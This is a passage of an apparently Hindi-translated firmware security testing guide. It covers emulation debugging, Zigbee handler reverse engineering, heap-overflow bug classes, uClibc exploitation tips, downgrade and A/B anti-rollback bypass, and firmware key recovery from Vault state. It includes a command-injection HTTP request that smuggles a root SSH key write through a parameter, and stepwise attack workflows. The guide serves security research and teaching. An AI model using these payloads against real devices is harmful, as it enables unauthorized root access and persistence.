जब slow boots, destructive startup scripts या अविश्वसनीय console logging के कारण failure का पता लगाना मुश्किल हो, तो guest के बाहर persistent state की जाँच करें। किसी running VM द्वारा उपयोग किए जा रहे overlay को कभी attach न करें; उसे `qemu-nbd` से expose करें, LVM discovery को intended NBD partition तक सीमित रखें, और disconnect करने से पहले volume group को deactivate करें।<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

दोहराने योग्य fault isolation के लिए, किसी स्थिर writable volume में timestamp वाले marker files लिखें और उन्हें offline सत्यापित करें; `/dev/kmsg`, FIFOs और अस्थायी consoles में rate limiting या process के जल्दी समाप्त होने से false negatives मिल सकते हैं। असंबंधित code बदलने से पहले विभिन्न layers के exact interfaces की भी तुलना करें: `uname -r` बनाम `/lib/modules/`, disk पर मौजूद ext4 features बनाम kernel configuration, और Mesa `libGL` generation बनाम DRI driver ABI तथा PCI से निकले driver names। कोई component मौजूद हो सकता है और `dlopen()` सफलतापूर्वक कर सकता है, फिर भी उपयोग योग्य न हो, क्योंकि उसका consumer किसी अलग ABI की अपेक्षा करता है।<sup>[[11]](#references)</sup>

## व्यवहार में Dynamic Analysis

इस चरण में analysis के लिए किसी वास्तविक या emulated device environment का उपयोग किया जाता है। OS और filesystem तक shell access बनाए रखना आवश्यक है। Emulation hardware interactions की हूबहू नकल नहीं कर सकता, इसलिए कभी-कभी emulation को फिर से शुरू करना पड़ सकता है। Analysis में filesystem की दोबारा जाँच करनी चाहिए, उजागर webpages और network services का इस्तेमाल करना चाहिए, और bootloader की vulnerabilities तलाशनी चाहिए। संभावित backdoor vulnerabilities की पहचान के लिए firmware integrity tests महत्वपूर्ण हैं।

## Runtime Analysis की तकनीकें

Runtime analysis में किसी process या binary के operating environment के भीतर उसके साथ interaction किया जाता है। इसके लिए breakpoints सेट करने और fuzzing तथा अन्य techniques के ज़रिए vulnerabilities पहचानने हेतु gdb-multiarch, Frida और Ghidra जैसे tools का उपयोग किया जाता है।

पूर्ण debugger के बिना embedded targets के लिए, device पर **statically-linked `gdbserver` की copy करें** और उससे remotely attach करें:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Zigbee / radio-co-processor संदेश मैपिंग

IoT hubs में RF stack अक्सर **radio MCU** और Linux userland process के बीच विभाजित होता है। एक उपयोगी workflow है इस path को map करना:<sup>[[8]](#references)</sup>

1. हवा में **RF frame**
2. radio MCU पर **controller-side parser**
3. Linux को forward किया गया **serial/UART text या TLV protocol** (उदाहरण के लिए `/dev/tty*`)
4. मुख्य daemon में **application dispatcher**
5. **protocol-specific handler / state machine**

इस architecture से एक के बजाय reverse engineering के दो लक्ष्य बनते हैं। अगर controller binary radio frames को `Group,Command,arg1,arg2,...` जैसे textual protocol में बदलता है, तो इनकी जानकारी निकालें:

- **message groups** और dispatch tables
- कौन-से messages **network** से आ सकते हैं और कौन-से स्वयं controller से
- सटीक **manufacturer-specific discriminator fields** (उदाहरण के लिए Zigbee `manufacturer_code` और custom `cluster_command`)
- कौन-से handlers केवल **commissioning**, discovery या firmware/model download के चरणों में reachable होते हैं

Zigbee के लिए, pairing traffic capture करें और देखें कि क्या target अब भी default **Link Key** `ZigBeeAlliance09` पर निर्भर है। अगर ऐसा है, तो commissioning traffic sniff करने से **Network Key** उजागर हो सकती है। Zigbee 3.0 install codes इस जोखिम को कम करते हैं, इसलिए यह नोट करें कि परीक्षण किया गया device उन्हें वास्तव में enforce करता है या नहीं।

### Manufacturer-specific protocol handlers और FSM-gated reachability

Vendor-specific Zigbee/ZCL commands अक्सर standardized clusters से बेहतर target होते हैं, क्योंकि वे कम battle-tested validation वाले **custom parsing code** और internal **FSMs** तक पहुँचते हैं।<sup>[[8]](#references)</sup>

व्यावहारिक workflow:

- **vendor-only handler** मिलने तक command dispatcher को reverse करें।
- **FSM state**, **event**, **check**, **action** और **next-state** tables की जानकारी निकालें।
- ऐसे **transitional states** पहचानें जो अपने-आप आगे बढ़ते हैं, और retry/error branches जो अंततः attacker-controlled state को reset या free करते हैं।
- यह मानने के बजाय कि buggy handler हमेशा reachable है, पुष्टि करें कि daemon को vulnerable state में लाने के लिए कौन-से वैध protocol exchanges ज़रूरी हैं।

Timing-sensitive protocols के लिए, Python framework से packet replay करना बहुत धीमा हो सकता है। अधिक विश्वसनीय तरीका है real hardware (उदाहरण के लिए **nRF52840**) पर vendor-grade stack के साथ वैध device का emulation करना, ताकि सही **endpoints**, **attributes** और commissioning timing उपलब्ध कराई जा सके।

### Embedded daemons में fragmented-download bug class

एक बार-बार दिखने वाली firmware bug class **fragmented blob/model/configuration downloads** में पाई जाती है:<sup>[[8]](#references)</sup>

1. **पहला fragment** (`offset == 0`) `ctx->total_size` store करता है और `malloc(total_size)` allocate करता है।
2. बाद के fragments केवल attacker-controlled **packet-local** fields को validate करते हैं, जैसे `packet_total_size >= offset + chunk_len`।
3. Copy में `memcpy(&ctx->buffer[offset], chunk, chunk_len)` का उपयोग होता है, लेकिन **मूल allocated size** के विरुद्ध जाँच नहीं होती।

इससे attacker ये कर सकता है:

- छोटा heap allocation करवाने के लिए **कम** declared total size वाला पहला वैध fragment भेजना।
- **अपेक्षित offset** के साथ बाद का ऐसा fragment भेजना जिसका `chunk_len` बड़ा हो।
- ऐसा forged packet-local size देना जो नई जाँचों को पूरा करे, लेकिन फिर भी मूल allocated buffer को overflow कर दे।

जब vulnerable path commissioning logic के पीछे हो, तो exploitation में malformed fragments भेजने से पहले target को अपेक्षित model-download या blob-download state तक पहुँचाने के लिए पर्याप्त **device emulation** शामिल होना चाहिए।

### Protocol-driven `free()` triggers

Embedded daemons में heap metadata exploitation trigger करने का सबसे आसान तरीका अक्सर "cleanup का इंतज़ार करना" नहीं, बल्कि protocol की अपनी **error handling को force करना** होता है:<sup>[[8]](#references)</sup>

- FSM को **retry** या **error** states में ले जाने के लिए malformed follow-up fragments भेजें।
- retry threshold पार करें ताकि daemon **context reset** करे और corrupted buffer को free करे।
- process के अन्य कारणों से crash होने से पहले allocator-side primitives trigger करने के लिए इस predictable `free()` का उपयोग करें।

यह embedded Linux में **musl/uClibc/dlmalloc-like** allocators के विरुद्ध खास तौर पर उपयोगी है, जहाँ chunk metadata corrupt करने से unlink/unbin logic को write primitive में बदला जा सकता है। एक स्थिर तरीका है **size field** को corrupt करके allocator traversal को overflowed buffer के अंदर staged **fake chunks** की ओर मोड़ना, बजाय इसके कि असली bin pointers को तुरंत overwrite करके process crash कर दिया जाए।

## Binary Exploitation और Proof-of-Concept

पहचानी गई vulnerabilities के लिए PoC विकसित करने हेतु target architecture की गहरी समझ और lower-level languages में programming की आवश्यकता होती है। Embedded systems में binary runtime protections दुर्लभ हैं, लेकिन जहाँ वे मौजूद हों, वहाँ Return Oriented Programming (ROP) जैसी techniques ज़रूरी हो सकती हैं।

### uClibc fastbin exploitation notes (embedded Linux)

- **Fastbins + consolidation:** uClibc, glibc की तरह fastbins का उपयोग करता है। बाद में होने वाला बड़ा allocation `__malloc_consolidate()` trigger कर सकता है, इसलिए किसी भी fake chunk को checks पास करने होंगे (सही size, `fd = 0`, और आसपास के chunks को "in use" माना जाना)।<sup>[[6]](#references)</sup>
- **ASLR के तहत non-PIE binaries:** अगर ASLR enabled है, लेकिन main binary **non-PIE** है, तो binary के अंदर के `.data/.bss` addresses स्थिर होते हैं। आप ऐसे region को target कर सकते हैं जो पहले से valid heap chunk header जैसा दिखता हो, ताकि fastbin allocation **function pointer table** पर आ जाए।
- **Parser-stopping NUL:** JSON parse होने पर payload में `\x00` parsing रोक सकता है, जबकि उसके बाद के attacker-controlled bytes stack pivot/ROP chain के लिए बने रहते हैं।
- **`/proc/self/mem` के ज़रिए shellcode:** `open("/proc/self/mem")`, `lseek()` और `write()` को call करने वाली ROP chain किसी ज्ञात mapping में executable shellcode रख सकती है और फिर उस पर jump कर सकती है।

## Firmware Analysis के लिए तैयार Operating Systems

[AttifyOS](https://github.com/adi0x90/attifyos) और [EmbedOS](https://github.com/scriptingxss/EmbedOS) जैसे operating systems firmware security testing के लिए pre-configured environments और ज़रूरी tools उपलब्ध कराते हैं।

## Firmware का विश्लेषण करने के लिए तैयार OSs

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS एक distro है, जिसका उद्देश्य Internet of Things (IoT) devices का security assessment और penetration testing करने में आपकी मदद करना है। सभी ज़रूरी tools के साथ pre-configured environment देकर यह आपका काफी समय बचाता है।
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): Ubuntu 18.04 पर आधारित embedded security testing operating system, जिसमें firmware security testing tools पहले से मौजूद हैं।

## Firmware Downgrade Attacks और Insecure Update Mechanisms

भले ही vendor firmware images के लिए cryptographic signature checks लागू करे, **version rollback (downgrade) protection अक्सर शामिल नहीं होती**। जब boot- या recovery-loader केवल embedded public key से signature verify करता है, लेकिन flash की जा रही image का *version* (या monotonic counter) नहीं जाँचता, तो attacker वैध रूप से **पुराना, vulnerable firmware install कर सकता है जिस पर अब भी valid signature हो** और इस तरह पहले patch की गई vulnerabilities को फिर से सामने ला सकता है।<sup>[[4]](#references)</sup>

आम attack workflow:

1. **पुरानी signed image प्राप्त करें**
   * इसे vendor के public download portal, CDN या support site से लें।
   * इसे companion mobile/desktop applications से निकालें (जैसे Android APK के `assets/firmware/` के अंदर)।
   * इसे VirusTotal, Internet archives, forums आदि जैसे third-party repositories से प्राप्त करें।
2. किसी भी उपलब्ध update channel के ज़रिए image को device पर **upload या serve करें**:
   * Web UI, mobile-app API, USB, TFTP, MQTT आदि।
   * कई consumer IoT devices में ऐसे *unauthenticated* HTTP(S) endpoints होते हैं जो Base64-encoded firmware blobs स्वीकार करते हैं, उन्हें server-side decode करते हैं और recovery/upgrade शुरू करते हैं।
3. Downgrade के बाद, ऐसी vulnerability का exploit करें जिसे नए release में patch किया गया था (उदाहरण के लिए, बाद में जोड़ा गया command-injection filter)।
4. Persistence हासिल होने के बाद, पहचान से बचने के लिए वैकल्पिक रूप से नवीनतम image को फिर से flash करें या updates disable कर दें।

### उदाहरण: Downgrade के बाद Command Injection

```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```

असुरक्षित (downgraded) firmware में, `md5` parameter को बिना sanitisation के सीधे shell command में जोड़ दिया जाता है, जिससे मनमाने commands inject किए जा सकते हैं (यहाँ — SSH key-based root access सक्षम करने के लिए)। बाद के firmware versions में एक बुनियादी character filter जोड़ा गया, लेकिन downgrade protection न होने से यह fix बेअसर हो जाता है।<sup>[[4]](#references)</sup>

### Mobile Apps से Firmware निकालना

कई vendors अपने companion mobile applications में पूरी firmware images शामिल करते हैं, ताकि app Bluetooth/Wi-Fi के ज़रिए device को update कर सके। ये packages आमतौर पर APK/APEX में `assets/fw/` या `res/raw/` जैसे paths पर unencrypted संग्रहीत होते हैं। `apktool`, `ghidra`, या यहाँ तक कि साधारण `unzip` जैसे tools आपको physical hardware को छुए बिना signed images निकालने देते हैं।<sup>[[4]](#references)</sup>

```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```

### A/B slot designs में केवल updater में मौजूद anti-rollback bypass

कुछ vendors anti-downgrade **ratchet** लागू करते हैं, लेकिन केवल *updater* logic में (उदाहरण के लिए, CAN पर UDS routine, recovery command या userspace OTA agent)। अगर **bootloader** बाद में केवल image signature/CRC जाँचता है और partition table या slot metadata पर भरोसा करता है, तो rollback protection को अब भी bypass किया जा सकता है।<sup>[[7]](#references)</sup>

कमज़ोर design का सामान्य रूप:

- Firmware metadata में version descriptor और **security ratchet** / monotonic counter, दोनों होते हैं।
- Updater image ratchet की तुलना persistent storage में मौजूद value से करता है और पुराने signed images को अस्वीकार करता है।
- Bootloader उस ratchet को **parse नहीं करता** और चुने गए slot को boot करने से पहले केवल header, CRC और signature verify करता है।
- Slot activation को अलग से partition table या प्रति-slot generation counter में store किया जाता है और इसे validated firmware के exact digest से **cryptographically bind नहीं** किया जाता।

इससे dual-slot systems में **एक image validate करने और दूसरी image boot करने** की सुविधा मिलती है। अगर attacker updater से current signed image के ज़रिए slot B को अगला boot target mark करवा सकता है और reboot से पहले बाद में slot B को overwrite कर सकता है, तो bootloader downgraded image को फिर भी boot कर सकता है, क्योंकि वह केवल पहले से committed slot metadata पर भरोसा करता है।

दुरुपयोग का आम तरीका:

1. Passive slot में **current signed** firmware upload करें और सामान्य validation/switch routine चलाएँ, ताकि layout उस slot को next active के रूप में mark करे।
2. **अभी reboot न करें**। उसी session में slot-preparation/erase routine को फिर से चलाएँ।
3. Stale boot-state या stale slot-selection logic का दुरुपयोग करके updater से **उसी physical slot** को erase करवाएँ जिसे अभी-अभी promote किया गया था।
4. उस slot में **पुराना, लेकिन अब भी signed** firmware लिखें।
5. Ratchet लागू करने वाली validation routine को छोड़ें और सीधे reboot करें।
6. Bootloader promoted slot चुनता है, केवल signature/integrity verify करता है और पुरानी image boot कर देता है।

A/B update implementations को reverse करते समय इन बातों पर ध्यान दें:

- Slot selection **boot-time flags** से तय होता है, जो सफल switch के बाद refresh नहीं होते।
- `prepare_passive_slot()` जैसी routine, **वर्तमान committed layout** के बजाय stale state के आधार पर slot erase करती है।
- `part_write_layout()` जैसा function केवल **generation counter** / active flag बढ़ाता है और validated image hash store नहीं करता।
- Ratchet checks userspace या updater code में लागू हैं, लेकिन ROM / bootloader / secure boot stages में **नहीं**।
- Erase या recovery routines content हटाने और दोबारा लिखने के बाद भी slot को bootable mark रहने देती हैं।

### Update Logic का आकलन करने के लिए Checklist

* क्या *update endpoint* का transport/authentication पर्याप्त रूप से सुरक्षित है (TLS + authentication)?
* क्या device flashing से पहले **version numbers** या **monotonic anti-rollback counter** की तुलना करता है?
* क्या image को secure boot chain के अंदर verify किया जाता है (जैसे, ROM code द्वारा signatures की जाँच)?
* क्या **bootloader updater के समान ratchet लागू करता है**, या केवल signature/CRC जाँचता है?
* क्या slot activation metadata **validated firmware digest/version से bound** है, या promotion के बाद slot को modify किया जा सकता है?
* Slot switch सफल होने के बाद, क्या device को reboot करना अनिवार्य है, या उसी session में बाद की update/erase routines अब भी चल सकती हैं?
* क्या userland code अतिरिक्त sanity checks करता है (जैसे, allowed partition map, model number)?
* क्या *partial* या *backup* update flows में वही validation logic दोबारा इस्तेमाल होती है?

> 💡  अगर ऊपर दी गई कोई भी चीज़ मौजूद नहीं है, तो platform संभवतः rollback attacks के प्रति vulnerable है।

## अभ्यास के लिए vulnerable firmware

Firmware में vulnerabilities खोजना सीखने के लिए, इन vulnerable firmware projects से शुरुआत करें।

- OWASP IoTGoat
  - [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
  - [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
  - [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
  - [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
  - [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
  - [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Embedded KMS/Vault state से firmware decryption keys प्राप्त करना

जब कोई update image थोड़े-से plaintext metadata को बड़े high-entropy blob के साथ मिलाती है, तो brute-force करने से पहले container triage करें:<sup>[[1]](#references)</sup>

- `hexdump`, `xxd`, `strings -tx`, `base64 -d` और `binwalk -E` से headers, offsets और line boundaries निकालें।
- `Salted__` का आमतौर पर मतलब OpenSSL `enc` format होता है: अगले 8 bytes salt होते हैं और बाकी bytes ciphertext।
- ऐसा Base64 field जो decode होकर ठीक `256` bytes का हो, इस बात का मज़बूत संकेत है कि वह RSA-2048 ciphertext है, जो किसी random firmware password/session key को wrap कर रहा है।
- उसी file में मौजूद detached PGP material अक्सर केवल authenticity की रक्षा करता है; इसे confidentiality mechanism न मानें।

अगर static key hunting (`grep`, `strings`, PEM/PGP searches) से कुछ न मिले, तो केवल private keys खोजने के बजाय **operational decrypt path** को reverse करें:

- Updater / management binary को decompile करें और पता लगाएँ कि encrypted blob कौन पढ़ता है, कौन-सा helper/API उसे unwrap करता है और वह किस logical key name की माँग करता है।
- Extracted root filesystem में KMS state (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`) के साथ unit files और init scripts खोजें।
- Plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens या local KMS auto-unseal scripts को private-key material के बराबर मानें।

अगर appliance में original Vault binary और storage backend मौजूद हों, तो Vault internals को फिर से लागू करने के बजाय उस environment को replay करना आमतौर पर आसान होता है:

```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```

With root on cloned KMS पर:

- Transit keys को केवल isolated clone के अंदर exportable बनाएं: `vault write transit/keys/<name>/config exportable=true`
- Unwrap key export करें: `vault read transit/export/encryption-key/<name>`
- Recovered RSA key को KMS में इस्तेमाल हुए exact padding/hash pair के साथ आज़माएं। PKCS#1 v1.5 decrypt और default OAEP decrypt का fail होना यह साबित **नहीं** करता कि key गलत है; Vault-backed flows में अक्सर SHA-256 वाला OAEP इस्तेमाल होता है, जबकि common libraries में default SHA-1 होता है।
- अगर payload `Salted__` से शुरू होता है, तो AES-CBC decryption आज़माने से पहले vendor के OpenSSL KDF को बिल्कुल वैसे ही दोहराएं (`EVP_BytesToKey`, पुराने appliances में अक्सर MD5)।

इससे "encrypted firmware" एक अधिक सामान्य समस्या बन जाता है: **appliance-side operational keys recover करें, फिर exact unwrap + KDF parameters को offline दोहराएं**।

## Training और Certifications

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## References

- [1] [Claude के साथ Firmware Cracking: वरिष्ठ-स्तर का कौशल, कनिष्ठ-स्तर की स्वायत्तता](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [2] [Firmware Security Testing की कार्यप्रणाली](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [3] [Practical IoT Hacking: Internet of Things पर हमले करने की definitive guide](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [4] [छोड़े जा चुके hardware में zero days का exploitation – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [5] [$20 के smart device ने मुझे आपके घर तक पहुंच कैसे दी](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
- [6] [अब आप mi को देखते हैं: अब आप Pwned हैं](https://labs.taszk.io/articles/post/nowyouseemi/)
- [7] [Synacktiv - Tesla Wall Connector को उसके charge port connector से exploit करना - भाग 2: anti-downgrade को bypass करना](https://www.synacktiv.com/en/publications/exploiting-the-tesla-wall-connector-from-its-charge-port-connector-part-2-bypassing)
- [8] [इसे Blink करें: Philips Hue Bridge का Over-the-Air Exploitation](https://www.synacktiv.com/en/publications/make-it-blink-over-the-air-exploitation-of-the-philips-hue-bridge.html)
- [9] [QEMU पर Tesla OS को ROOT करना, भाग 1: Unpacking](https://cn0xroot.wordpress.com/2026/09/19/root-tesla-os-on-qemu-part-1-unpacking)
- [10] [Linux kernel documentation - dm-linear](https://docs.kernel.org/admin-guide/device-mapper/linear.html)
- [11] [QEMU पर Tesla OS को ROOT करना, भाग 2: Debugging और Fixing](https://cn0xroot.wordpress.com/2026/09/20/root_tesla_os_on_qemu_part_2_debugging_fixing)
- [12] [Dell BIOS Passwords: कमजोर XOR encryption से SPI Flash से recovery संभव (CVE-2026-40639)](https://mdsec.co.uk/2026/07/dell-bios-passwords-weak-xor-encryption-allows-recovery-from-spi-flash-cve-2026-40639)
- [13] [R3n5k1/dellpwn - Dell BIOS password recovery tooling](https://github.com/R3n5k1/dellpwn)
- [14] [VoidStar Security — Hardware Hacking पर दोबारा नज़र, भाग 2](https://voidstarsec.com/blog/brushing-up-part-2)
{{#include ../../banners/hacktricks-training.md}}
